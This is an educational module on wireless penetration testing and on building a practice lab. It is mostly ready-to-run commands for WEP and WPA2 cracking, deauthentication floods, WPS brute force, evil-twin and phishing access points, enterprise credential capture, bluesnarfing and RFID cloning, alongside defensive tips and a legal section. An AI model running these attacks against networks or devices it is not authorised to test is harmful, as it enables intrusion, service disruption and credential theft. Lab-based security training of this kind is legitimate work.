# Fundamentals of Wireless Hacking and How to Build Your Own Wireless Penetration Testing Lab

## Introduction

Wireless networks present unique security challenges and attack vectors. This module covers wireless security fundamentals, common attacks, and how to build a lab for practicing wireless penetration testing techniques.

## Why Wireless Security?

- **Pervasive**: Wi-Fi networks everywhere
- **Physical Access Not Required**: Attacks from parking lot
- **Weak Security**: Many networks poorly configured
- **Entry Point**: Gateway to internal networks
- **IoT Devices**: Increasing wireless device adoption
- **Bluetooth/RFID**: Additional wireless protocols

## Wireless Network Fundamentals

### 802.11 Standards

- **802.11a**: 5 GHz, up to 54 Mbps
- **802.11b**: 2.4 GHz, up to 11 Mbps
- **802.11g**: 2.4 GHz, up to 54 Mbps
- **802.11n**: 2.4/5 GHz, up to 600 Mbps (Wi-Fi 4)
- **802.11ac**: 5 GHz, up to 6.9 Gbps (Wi-Fi 5)
- **802.11ax**: 2.4/5/6 GHz, up to 9.6 Gbps (Wi-Fi 6)

### Frequency Bands

**2.4 GHz Band**
- Channels: 1-14 (1-11 in US)
- Better range, more interference
- Crowded spectrum

**5 GHz Band**
- More channels available
- Less interference
- Shorter range

**6 GHz Band (Wi-Fi 6E)**
- New spectrum
- Minimal interference
- Requires compatible hardware

### Wireless Security Protocols

#### WEP (Wired Equivalent Privacy)
- **Status**: Deprecated, completely broken
- **Encryption**: RC4 stream cipher
- **Key Sizes**: 64-bit or 128-bit
- **Vulnerability**: Can be cracked in minutes

#### WPA (Wi-Fi Protected Access)
- **Status**: Deprecated
- **Encryption**: TKIP
- **Vulnerability**: Susceptible to various attacks

#### WPA2 (802.11i)
- **Status**: Current standard
- **Encryption**: AES-CCMP
- **Modes**: Personal (PSK) and Enterprise (802.1X)
- **Vulnerability**: KRACK attack, weak passwords

#### WPA3
- **Status**: Latest standard
- **Encryption**: AES-GCMP
- **Features**: SAE (Simultaneous Authentication of Equals)
- **Benefits**: Forward secrecy, protection against offline dictionary attacks

### Authentication Methods

**Open Authentication**
- No password required
- Often with captive portal

**Pre-Shared Key (PSK)**
- Shared password for all users
- Common in home/small business

**802.1X/EAP (Enterprise)**
- Individual user credentials
- RADIUS authentication server
- Various EAP types: EAP-TLS, PEAP, EAP-TTLS

## Building a Wireless Penetration Testing Lab

### Hardware Requirements

#### Wireless Adapters

**Essential Features:**
- Monitor mode support
- Packet injection capability
- Compatible chipset

**Recommended Chipsets:**
- **Atheros AR9271**: Excellent compatibility
- **Ralink RT3070**: Good injection support
- **Realtek RTL8812AU**: Dual-band support
- **MediaTek MT7612U**: Modern, dual-band

**Recommended Adapters:**
- **Alfa AWUS036NHA**: 2.4 GHz, AR9271 chipset
- **Alfa AWUS036ACH**: Dual-band, RTL8812AU chipset
- **TP-Link TL-WN722N v1**: Budget option (avoid v2/v3)
- **Panda PAU09**: Dual-band option

#### Access Points for Testing

- **TP-Link**: Affordable, good for testing
- **Ubiquiti**: Enterprise features
- **Mikrotik**: Advanced configuration options
- **Old routers**: For destructive testing

#### Additional Hardware

- **Raspberry Pi**: Portable attack platform
- **Alfa R36**: Portable router for rogue AP
- **Hak5 WiFi Pineapple**: Specialized wireless auditing device
- **External antennas**: Increase range

### Software Setup

#### Operating Systems

**Kali Linux**
```bash
# Pre-installed wireless tools
aircrack-ng suite
wifite
reaver
bully
kismet
```

**Parrot Security OS**
```bash
# Similar toolset to Kali
# Additional privacy features
```

#### Essential Tools Installation

```bash
# Update system
sudo apt update && sudo apt upgrade

# Install wireless tools
sudo apt install aircrack-ng
sudo apt install reaver
sudo apt install bully
sudo apt install wifite
sudo apt install kismet
sudo apt install hostapd
sudo apt install dnsmasq

# Install additional tools
sudo apt install hcxtools
sudo apt install hcxdumptool
sudo apt install hashcat
```

### Lab Network Setup

#### Basic Lab Architecture

```
[Attack Machine (Kali)] <--Wireless--> [Test AP] <--Wired--> [Target Network]
                                                                    |
                                                              [Test Clients]
```

#### Isolated Test Environment

1. **Dedicated Access Point**: Configure for testing
2. **Separate VLAN**: Isolate from production
3. **No Internet**: Prevent accidental attacks
4. **Multiple SSIDs**: Test different security configurations

#### Test Configurations

```
SSID: TestLab-Open (Open network)
SSID: TestLab-WEP (WEP encryption)
SSID: TestLab-WPA2 (WPA2-PSK)
SSID: TestLab-Enterprise (WPA2-Enterprise)
SSID: TestLab-Hidden (Hidden SSID)
```

## Wireless Attack Techniques

### 1. Wireless Reconnaissance

#### Passive Scanning

```bash
# Put adapter in monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Target specific channel
sudo airodump-ng -c 6 wlan0mon

# Target specific BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

#### Active Scanning

```bash
# Kismet
sudo kismet

# Wash (WPS scanning)
wash -i wlan0mon

# Recon-ng
recon-ng
```

### 2. WEP Cracking

```bash
# Capture traffic
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon

# Fake authentication
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# ARP replay attack (generate traffic)
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crack WEP key
sudo aircrack-ng wep-01.cap
```

### 3. WPA/WPA2 PSK Cracking

#### Capture Handshake

```bash
# Monitor and capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthenticate client to force handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Verify handshake captured
sudo aircrack-ng capture-01.cap
```

#### Crack Handshake

```bash
# Aircrack-ng with wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Hashcat (faster, GPU-accelerated)
# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=rockyou.txt --format=wpapsk capture.hccap
```

### 4. WPS Attacks

#### Reaver (Brute Force)

```bash
# Scan for WPS-enabled APs
wash -i wlan0mon

# Attack WPS PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With delay to avoid lockout
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5 -T 0.5

# Pixie Dust attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K
```

#### Bully

```bash
# WPS attack with bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6

# Pixie Dust with bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
```

### 5. Evil Twin / Rogue AP

#### Create Fake AP

```bash
# hostapd configuration (hostapd.conf)
interface=wlan0
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g

# Start hostapd
sudo hostapd hostapd.conf

# Configure DHCP (dnsmasq.conf)
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,12h

# Start dnsmasq
sudo dnsmasq -C dnsmasq.conf

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# NAT configuration
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

#### Automated Tools

```bash
# Wifiphisher
sudo wifiphisher -aI wlan0 -eI eth0

# Fluxion
sudo ./fluxion.sh

# WiFi Pumpkin
sudo wifi-pumpkin
```

### 6. Deauthentication Attack

```bash
# Deauth specific client
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon

# Deauth all clients (broadcast)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Limited deauth packets
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### 7. PMKID Attack

```bash
# Capture PMKID (no clients needed)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 capture.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

### 8. WPA Enterprise Attacks

```bash
# Capture RADIUS traffic
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise wlan0mon

# Evil Twin for credential capture
# Use hostapd-wpe (Wireless Pwnage Edition)
sudo hostapd-wpe hostapd-wpe.conf

# Crack captured hashes
asleap -C challenge -R response -W wordlist.txt
```

## Automated Wireless Auditing

### Wifite

```bash
# Automated wireless auditing
sudo wifite

# Attack specific target
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# WPS-only attacks
sudo wifite --wps

# Skip WPS attacks
sudo wifite --no-wps
```

### WiFi Pineapple

Commercial wireless auditing device with web interface:
- Evil Twin attacks
- Credential harvesting
- Man-in-the-middle
- Reconnaissance modules

## Bluetooth Hacking Basics

### Bluetooth Tools

```bash
# Install bluez tools
sudo apt install bluez bluez-tools

# Scan for devices
hcitool scan

# Device information
hcitool info MAC:ADDRESS

# Service discovery
sdptool browse MAC:ADDRESS

# Bluesnarfing
bluesnarfer -b MAC:ADDRESS -C channel

# Spoofing
spooftooph -i hci0 -n "New Name" -a NEW:MAC:ADDR
```

## RFID/NFC Basics

### Tools

- **Proxmark3**: RFID research tool
- **ACR122U**: USB NFC reader
- **Flipper Zero**: Multi-tool for RFID/NFC

### Basic Operations

```bash
# Read RFID tag
proxmark3> lf search

# Clone RFID tag
proxmark3> lf clone

# NFC operations with libnfc
nfc-list
nfc-poll
```

## Wireless Security Best Practices

### For Networks

1. **Use WPA3** (or WPA2 if WPA3 unavailable)
2. **Strong Passwords**: 20+ characters, random
3. **Disable WPS**: Known vulnerabilities
4. **Hide SSID**: Minor security through obscurity
5. **MAC Filtering**: Additional layer (easily bypassed)
6. **Network Segmentation**: Guest network separate from internal
7. **Regular Updates**: Keep firmware current
8. **Monitor**: Use wireless IDS/IPS
9. **Enterprise Authentication**: Use 802.1X for organizations
10. **Disable Legacy Protocols**: No WEP, WPA

### For Clients

1. **Forget Unknown Networks**: Don't auto-connect
2. **Use VPN**: On untrusted networks
3. **Verify Networks**: Confirm legitimate before connecting
4. **Disable Auto-Connect**: Manual connection only
5. **Keep Updated**: OS and drivers current

## Legal and Ethical Considerations

- **Authorization**: Only test your own networks or with explicit permission
- **Interference**: Wireless attacks can affect others
- **FCC Regulations**: Be aware of transmission power limits
- **Jamming**: Illegal in most jurisdictions
- **Privacy**: Don't capture others' traffic
- **Responsible Disclosure**: Report vulnerabilities appropriately

## Practical Exercises

1. Set up test AP with different security configurations
2. Capture and crack WPA2 handshake
3. Perform WPS attack on vulnerable AP
4. Create evil twin access point
5. Use Wifite for automated testing
6. Practice PMKID attack
7. Set up wireless IDS with Kismet

## Troubleshooting

### Adapter Not Working

```bash
# Check if adapter detected
lsusb
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Restart network manager
sudo systemctl restart NetworkManager

# Check driver
dmesg | grep -i wireless
```

### Monitor Mode Issues

```bash
# Manual monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify monitor mode
iwconfig wlan0
```

## Resources

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/)
- [Wifite](https://github.com/derv82/wifite2)
- [WiFi Pineapple](https://shop.hak5.org/products/wifi-pineapple)
- [Wireless Security Standards](https://www.wi-fi.org/discover-wi-fi/security)
- [OSWP Certification](https://www.offensive-security.com/wifu-oswp/)

## Next Steps

After understanding wireless security, you'll learn about buffer overflows and low-level exploitation techniques.

